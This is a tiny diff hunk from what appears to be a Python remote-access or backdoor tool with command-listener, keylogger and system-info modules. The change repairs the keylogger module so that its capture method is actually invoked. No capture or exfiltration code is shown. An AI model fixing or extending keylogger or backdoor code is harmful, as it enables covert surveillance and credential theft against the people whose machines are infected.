@@ -19,7 +19,7 @@ def command_listener():
 
 def mod_keylogger():
     k = Keylogger()
-    k.keylogger
+    k.keylogger()
 
 def mod_sysinfo():
     s = SysInfo()
